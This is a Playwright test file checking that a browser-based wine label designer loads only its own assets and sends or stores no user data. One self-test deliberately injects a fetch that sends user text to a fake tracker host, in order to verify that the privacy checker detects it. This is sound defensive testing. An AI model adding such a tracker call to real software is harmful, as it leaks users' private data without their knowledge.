import { expect, test, type Page } from './fixtures';
import { createI18n } from '../src/i18n';
import { DESIGN_INPUT, IMAGE_INPUT, captureDownloads, chooseFile, download } from './helpers';
import { appSources, privacyProblems, type RecordedRequest } from './privacy';

const { t } = createI18n('en');
const ORIGIN = 'http://localhost:4173';

/** Values only this test enters; none of them may appear in any request. */
const USER_TEXT = 'Privates Weingut Q7X';
const PHOTO_NAME = 'privat-foto-Z9K.jpg';
const DESIGN_NAME = 'mein-entwurf-K3P.json';

function record(page: Page) {
  const requests: RecordedRequest[] = [];
  const sockets: string[] = [];
  const consoleErrors: string[] = [];
  page.on('request', (request) => {
    requests.push({
      url: request.url(),
      method: request.method(),
      postData: request.postData(),
      headers: request.headers(),
    });
  });
  page.on('websocket', (socket) => sockets.push(socket.url()));
  page.on('console', (message) => {
    if (message.type() === 'error') consoleErrors.push(message.text());
  });
  page.on('pageerror', (error) => consoleErrors.push(error.message));
  return { requests, sockets, consoleErrors };
}

test.describe('privacy checker (self-test)', () => {
  test('flags other origins, sent data, query strings and user data', () => {
    const get = (url: string): RecordedRequest => ({
      url,
      method: 'GET',
      postData: null,
      headers: {},
    });
    expect(
      privacyProblems(
        [
          get(`${ORIGIN}/`),
          get(`${ORIGIN}/assets/index-abc.js`),
          get('data:image/png;base64,AAAA'),
          get('blob:http://localhost:4173/1234'),
        ],
        { sources: appSources(ORIGIN), userData: [USER_TEXT] },
      ),
    ).toEqual([]);

    const problems = privacyProblems(
      [
        get('https://fonts.example.com/font.woff2'),
        { url: `${ORIGIN}/api/save`, method: 'POST', postData: '{"text":"x"}', headers: {} },
        get(`${ORIGIN}/assets/app.js?name=Privates%20Weingut%20Q7X`),
        { ...get(`${ORIGIN}/assets/a.js`), headers: { 'x-note': 'privat-foto-Z9K.jpg' } },
      ],
      { sources: appSources(ORIGIN), userData: [USER_TEXT, PHOTO_NAME] },
    );
    expect(problems.join('\n')).toContain(
      'request to another origin: GET https://fonts.example.com',
    );
    expect(problems.join('\n')).toContain('sends data (POST)');
    expect(problems.join('\n')).toContain('has a request body');
    expect(problems.join('\n')).toContain("not one of the app's static files: POST");
    expect(problems.join('\n')).toContain('has a query string');
    expect(problems.join('\n')).toContain(`carries user data "${USER_TEXT}"`);
    expect(problems.join('\n')).toContain(`carries user data "${PHOTO_NAME}"`);
  });

  test('embedded in a shop: the shop page and the app files on the CDN only (AGENTS.md)', () => {
    const get = (url: string): RecordedRequest => ({
      url,
      method: 'GET',
      postData: null,
      headers: {},
    });
    const sources = [
      { origin: 'https://shop.example', paths: /^\/products\/[\w-]+$/ },
      { origin: 'https://cdn.example', paths: /^\/extensions\/x1\/assets\/[\w.-]+$/ },
    ];
    expect(
      privacyProblems(
        [
          get('https://shop.example/products/custom-label'),
          get('https://cdn.example/extensions/x1/assets/wine-label-designer.js'),
          get('https://cdn.example/extensions/x1/assets/font-abc.ttf'),
        ],
        { sources, userData: [USER_TEXT] },
      ),
    ).toEqual([]);

    const problems = privacyProblems(
      [
        get('https://cdn.example/other-app/tracker.js'),
        get('https://shop.example/cart.js'),
        get(`${ORIGIN}/assets/index-abc.js`),
        get('https://cdn.example/extensions/x1/assets/a.js?text=Privates%20Weingut%20Q7X'),
      ],
      { sources, userData: [USER_TEXT] },
    ).join('\n');
    expect(problems).toContain(
      "not one of the app's static files: GET https://cdn.example/other-app/tracker.js",
    );
    expect(problems).toContain(
      "not one of the app's static files: GET https://shop.example/cart.js",
    );
    expect(problems).toContain(`request to another origin: GET ${ORIGIN}/assets/index-abc.js`);
    expect(problems).toContain('has a query string');
    expect(problems).toContain(`carries user data "${USER_TEXT}"`);
  });

  // The test blocks the fake tracker request itself; the browser logs that as an error.
  test.use({ expectedConsoleErrors: [/Failed to load resource: net::ERR_FAILED/] });

  test('the recorder sees requests the page makes (tracker injected on purpose)', async ({
    page,
  }) => {
    // Never reaches the internet: .invalid does not resolve, and the route aborts it anyway.
    await page.route('https://tracker.example.invalid/**', (route) => route.abort());
    const { requests } = record(page);
    await page.goto('/');
    await page.evaluate(async (secret) => {
      await fetch(`https://tracker.example.invalid/collect?t=${encodeURIComponent(secret)}`).catch(
        () => undefined,
      );
    }, USER_TEXT);
    const problems = privacyProblems(requests, {
      sources: appSources(ORIGIN),
      userData: [USER_TEXT],
    });
    expect(problems.some((problem) => problem.startsWith('request to another origin'))).toBe(true);
    expect(problems.some((problem) => problem.startsWith('carries user data'))).toBe(true);
  });
});

test("full flow: only the app's own files are loaded, nothing about the user is sent or stored", async ({
  page,
  context,
}) => {
  const { requests, sockets, consoleErrors } = record(page);
  await captureDownloads(page);
  await page.goto('/');
  expect(new URL(page.url()).origin).toBe(ORIGIN);
  await expect(page.getByTestId('bottle-preview')).toHaveAttribute('data-mode', /3d|flat/, {
    timeout: 20_000,
  });

  // Nothing is stored until the user uses the language switch.
  expect(await page.evaluate(() => Object.keys(localStorage))).toEqual([]);

  // Template, own text, bottle, photo.
  await page
    .getByRole('group', { name: t('templates:templates') })
    .getByRole('button', { name: t('templates:templateNames.classic') })
    .click();
  const layers = page.getByRole('list', { name: t('editor:layers') });
  await layers.getByRole('button', { name: 'Spätburgunder' }).click();
  await page.getByLabel(t('editor:fields.text'), { exact: true }).fill(USER_TEXT);
  await page
    .getByRole('group', { name: t('templates:bottles') })
    .getByRole('button', { name: t('templates:bottleNames.schlegel-750') })
    .click();
  await chooseFile(page, IMAGE_INPUT, PHOTO_NAME, 'image/jpeg', {
    canvas: { type: 'image/jpeg', width: 1200, height: 900 },
  });
  await expect(layers.getByRole('button', { name: t('editor:imageLayer') })).toBeVisible();
  await expect
    .poll(() => page.getByTestId('bottle-preview').getAttribute('data-revision'))
    .not.toBeNull();

  // Save the design and open it again (file in, file out; no upload).
  const saved = await download(page, t('design:save'));
  await chooseFile(page, DESIGN_INPUT, DESIGN_NAME, 'application/json', {
    text: new TextDecoder().decode(saved.bytes),
  });
  await expect(layers.getByRole('button', { name: USER_TEXT })).toBeVisible();

  // PDF and calibration page (loads pdf-lib), then switch the language.
  await download(page, t('export:download'));
  await expect(page.getByTestId('export-status')).toHaveText(t('export:done'));
  await download(page, t('export:downloadCalibration'));
  await page.getByRole('button', { name: 'Deutsch (DE)' }).click();
  await expect(page.getByRole('heading', { level: 1 })).toHaveText(createI18n('de').t('app:title'));

  // Network: the app's own files only, nothing the user entered.
  expect(requests.length).toBeGreaterThan(5);
  expect(
    privacyProblems(requests, {
      sources: appSources(ORIGIN),
      userData: [USER_TEXT, PHOTO_NAME, DESIGN_NAME],
    }),
  ).toEqual([]);
  expect(sockets).toEqual([]);

  // Nothing stored except the language choice; no cookies, no service worker.
  expect(await context.cookies()).toEqual([]);
  const stored = await page.evaluate(async () => ({
    local: Object.keys(localStorage),
    session: Object.keys(sessionStorage),
    cookie: document.cookie,
    workers: (await navigator.serviceWorker.getRegistrations()).length,
    databases: (await indexedDB.databases()).length,
  }));
  expect(stored).toEqual({
    local: ['wine-label.language'],
    session: [],
    cookie: '',
    workers: 0,
    databases: 0,
  });

  // No errors in the browser console during the whole flow.
  expect(consoleErrors).toEqual([]);
});
